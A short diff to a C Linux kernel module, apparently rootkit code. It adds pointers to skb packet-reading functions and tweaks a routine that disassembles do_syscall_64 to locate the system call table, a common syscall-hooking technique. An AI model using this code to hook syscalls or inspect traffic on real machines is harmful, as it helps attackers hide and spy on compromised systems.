@@ -64,6 +64,7 @@
  * 28/01/2018 - D1W0U
  */
 
+#include <linux/skbuff.h>
 #include <linux/vmalloc.h>
 #include <asm/desc.h>
 #include <linux/net.h>
@@ -208,6 +209,9 @@ int load(void) {
 	f_strlen = strlen;
 	f_kstrtoull = kstrtoull;
 	f_memcpy = memcpy;
+	f_skb_prepare_seq_read = skb_prepare_seq_read;
+	f_skb_seq_read = skb_seq_read;
+	f_skb_abort_seq_read = skb_abort_seq_read;
 
 	kernel_tree = get_kernel_tree();
 
@@ -924,7 +928,7 @@ void *search_sct_slowpath(unsigned int **psct_addr) {
 			if (tmp != NULL) {
 				sct = tmp;
 				pinfo("do_syscall_64 maybe at %Lx\n", sct);
-				disassemble(sct, 0x100);
+				//disassemble(sct, 0x100);
 				tmp = disass_search_inst_addr(sct, "call", "*-%lx(", 0x100, 1, (void **)psct_addr);
 				if (tmp != NULL) {
 					sct = tmp;
